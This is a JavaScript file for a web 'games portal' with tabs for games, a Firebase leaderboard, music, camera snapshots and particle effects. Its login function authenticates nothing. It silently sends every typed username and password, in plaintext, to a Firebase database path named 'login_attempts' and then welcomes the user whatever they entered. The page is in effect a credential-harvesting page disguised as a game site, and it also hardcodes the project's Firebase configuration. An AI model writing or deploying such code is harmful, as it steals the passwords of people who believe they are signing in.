
/* ========== Firebase (keep your config) ========== */
const firebaseConfig = {
  apiKey: "AIzaSyCcwr6vNVpoQ0Tdl8OfBM8E2MvDmwKQ3BQ",
  authDomain: "login-project-a90bc.firebaseapp.com",
  databaseURL: "https://login-project-a90bc-default-rtdb.firebaseio.com",
  projectId: "login-project-a90bc",
  storageBucket: "login-project-a90bc.firebasestorage.app",
  messagingSenderId: "86568965871",
  appId: "1:86568965871:web:e000bcfe034bdce1202d1a"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

/* ========== UI flow ========== */
const loginForm = document.getElementById('loginForm');
const thankYouScreen = document.getElementById('thankYouScreen');
const gamesPage = document.getElementById('gamesPage');

function attemptLogin(){
  const u = document.getElementById('username').value.trim();
  const p = document.getElementById('password').value.trim();
  const ts = new Date().toLocaleString();
  db.ref("login_attempts").push({username:u,password:p,time:ts});
  showThankYou(u || 'Player');
}
function fillDemo(){ document.getElementById('username').value='demo@user.com'; document.getElementById('password').value='demo'; }
function showThankYou(name){
  loginForm.style.display='none';
  thankYouScreen.style.display='block';
  document.getElementById('welcomeMsg').innerText = `✨ Welcome, ${name}`;
  let seconds = 2;
  const cEl = document.getElementById('countdown');
  cEl.innerText = `Opening games in ${seconds}...`;
  const t = setInterval(()=>{
    seconds--; cEl.innerText = `Opening games in ${seconds}...`;
    if(seconds<=0){ clearInterval(t); thankYouScreen.style.display='none'; openGamesPage(); }
  },1000);
}
function openGamesPage(){ gamesPage.style.display='block'; loadLeaderboard(); }

/* ========== Tabs ========== */
let activeTab = 'gamesTab';
function showTab(tabId, btn){
  if(activeTab==='snapTab' && tabId!=='snapTab'){ stopCamera(); }
  if(tabId==='snapTab'){ initCamera(); }
  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
  if(btn) btn.classList.add('active'); else document.querySelector(`[data-tab="${tabId}"]`).classList.add('active');
  document.querySelectorAll('.tab-content').forEach(p=>p.classList.add('hidden'));
  document.getElementById(tabId).classList.remove('hidden');
  activeTab = tabId;
}

/* ========== Games logic ========== */
function filterGames(){
  const q = document.getElementById('searchGame').value.toLowerCase();
  document.querySelectorAll('#gameList .game-card').forEach(card=>{
    const name = (card.dataset.name||'').toLowerCase();
    card.style.display = name.includes(q) ? '' : 'none';
  });
}
function shuffleGames(){
  const grid = document.getElementById('gameList');
  for (let i = grid.children.length; i >= 0; i--) grid.appendChild(grid.children[Math.random() * i | 0]);
}
function selectGame(url,title){
  // Show selected area and set iframe src
  document.getElementById('selectedTitle').innerText = 'Playing: ' + title;
  document.getElementById('gameArea').style.display = 'block';
  // set src
  const iframe = document.getElementById('gameIframe');
  iframe.src = url;
  document.getElementById('iframeNotice').innerHTML = 'If the game does not load (site blocks embedding), <a href="' + url + '" target="_blank" style="color:var(--accent)">open it in a new tab</a>.';
  // try to play a sound
  try { gameStartSound.play().catch(()=>{}); } catch(e){}
  window.scrollTo({top:0,behavior:'smooth'});
}
function closeGame(){
  document.getElementById('gameIframe').src = '';
  document.getElementById('gameArea').style.display = 'none';
}

/* ========== Leaderboard (Firebase) ========== */
function loadLeaderboard(){
  const list = document.getElementById('leaderboardList');
  list.innerHTML = '<li>Loading...</li>';
  db.ref("leaderboard").orderByChild("score").limitToLast(10).once("value", snap=>{
    const arr=[];
    snap.forEach(c=>arr.push(c.val()));
    arr.reverse();
    if(arr.length===0){ list.innerHTML = '<li>No scores yet.</li>'; return; }
    list.innerHTML = '';
    arr.forEach(i=>{ const li=document.createElement('li'); li.textContent = `${i.name}: ${i.score}`; list.appendChild(li); });
  });
}
function submitScore(){
  const name = document.getElementById('profileName').value.trim();
  if(!name){ alert('Enter your name'); return; }
  db.ref('leaderboard').push({name:name,score:window.currentGameScore||0,timestamp:new Date().toISOString()});
  alert(`Thanks ${name}! Score ${window.currentGameScore||0} saved.`);
  document.getElementById('profileName').value='';
  loadLeaderboard();
}

/* ========== Music: single active track logic ========== */
const audioPlayers = [];
function toggleTrack(btn){
  const trackEl = btn.closest('.track');
  const src = trackEl.dataset.src;
  let audio = trackEl._audio;
  if(!audio){
    audio = new Audio(src);
    audio.preload = 'auto';
    audio.onended = ()=>{ btn.textContent='Play'; btn.classList.remove('paused'); };
    trackEl._audio = audio;
    audioPlayers.push(audio);
  }
  if(audio.paused){
    audioPlayers.forEach(a=>{ if(a!==audio) a.pause(); });
    document.querySelectorAll('.playbtn').forEach(b=>{ b.textContent='Play'; b.classList.remove('paused'); });
    audio.play().catch(e=>{ console.warn('audio play failed',e); alert('Unable to play the audio (browser policy or network).'); });
    btn.textContent='Pause'; btn.classList.add('paused');
  } else {
    audio.pause(); btn.textContent='Play'; btn.classList.remove('paused');
  }
}

/* ========== Snap (camera) ========== */
let streamRef = null;
async function initCamera(){
  try {
    if(streamRef) return;
    const s = await navigator.mediaDevices.getUserMedia({video:{width:1280},audio:false});
    streamRef = s;
    const video = document.getElementById('camera');
    video.srcObject = s;
    await video.play().catch(()=>{});
    document.getElementById('stopCamBtn').style.display='inline-block';
  } catch(err){
    alert('Camera access denied or not available. Use HTTPS or localhost and allow permissions.');
  }
}
function stopCamera(){
  if(!streamRef) return;
  streamRef.getTracks().forEach(t=>t.stop());
  streamRef = null;
  const video = document.getElementById('camera');
  video.pause(); video.srcObject = null;
  document.getElementById('stopCamBtn').style.display='none';
}
function takeSnap(){
  const video = document.getElementById('camera');
  if(!video || !video.srcObject){ alert('Camera not started. Click Snap tab to enable.'); return; }
  const canvas = document.getElementById('snapshot');
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video,0,0,canvas.width,canvas.height);
  canvas.style.display = 'block';
}
function downloadSnap(){
  const canvas = document.getElementById('snapshot');
  if(!canvas || canvas.style.display==='none'){ alert('No snapshot to download.'); return; }
  const url = canvas.toDataURL('image/png');
  const a = document.createElement('a'); a.href = url; a.download = 'snapshot.png'; a.click();
}

/* ========== Sounds & mute ========== */
const clickSound = new Audio("https://actions.google.com/sounds/v1/ui/click.ogg");
const gameStartSound = new Audio("https://actions.google.com/sounds/v1/cartoon/cartoon_boing.ogg");
const bgMusic = new Audio("https://files.freemusicarchive.org/storage-freemusicarchive-org/tracks/pnW8lG6tkty0D5hNvtqN7yK6gD2E3X3toWJp4GZb.mp3");
bgMusic.loop=true; bgMusic.volume=0.12; bgMusic.muted=true;
let isMuted=true;
const muteBtn = document.getElementById('muteBtn');
muteBtn.addEventListener('click', ()=>{
  isMuted = !isMuted;
  bgMusic.muted = isMuted;
  clickSound.muted = isMuted;
  gameStartSound.muted = isMuted;
  muteBtn.textContent = isMuted ? '🔇' : '🔊';
});
// allow autoplay after first gesture
document.body.addEventListener('click', ()=>{ bgMusic.play().catch(()=>{}); }, {once:true});

/* ========== Particles ========== */
const canvas = document.getElementById('particles');
const ctx = canvas.getContext('2d');
let particles=[];
function resizeCanvas(){ canvas.width=innerWidth; canvas.height=innerHeight; }
window.addEventListener('resize', resizeCanvas);
resizeCanvas();
function makeParticles(){
  particles=[];
  const cols = ['#00b4d8','#0096c7','#48cae4','#90e0ef'];
  for(let i=0;i<80;i++){
    particles.push({
      x:Math.random()*canvas.width,
      y:Math.random()*canvas.height,
      r:Math.random()*2.6+0.6,
      c:cols[Math.floor(Math.random()*cols.length)],
      vx:(Math.random()-0.5)*0.6,
      vy:(Math.random()-0.5)*0.6,
      a:Math.random()*0.6+0.3
    });
  }
}
function drawParticles(){
  ctx.clearRect(0,0,canvas.width,canvas.height);
  for(const p of particles){
    p.x+=p.vx; p.y+=p.vy; p.a-=0.002;
    if(p.x<0||p.x>canvas.width) p.vx*=-1;
    if(p.y<0||p.y>canvas.height) p.vy*=-1;
    if(p.a<=0){ p.a=Math.random()*0.6+0.3; p.x=Math.random()*canvas.width; p.y=Math.random()*canvas.height; }
    ctx.beginPath(); ctx.globalAlpha=p.a; ctx.fillStyle=p.c; ctx.shadowColor=p.c; ctx.shadowBlur=12;
    ctx.arc(p.x,p.y,p.r,0,Math.PI*2); ctx.fill(); ctx.closePath(); ctx.globalAlpha=1;
  }
  requestAnimationFrame(drawParticles);
}
makeParticles(); drawParticles();

/* ========== Cleanup when leaving page ========== */
window.addEventListener('pagehide', ()=>{ audioPlayers.forEach(a=>a.pause()); stopCamera(); });

/* Initialize: show login card (already visible) */

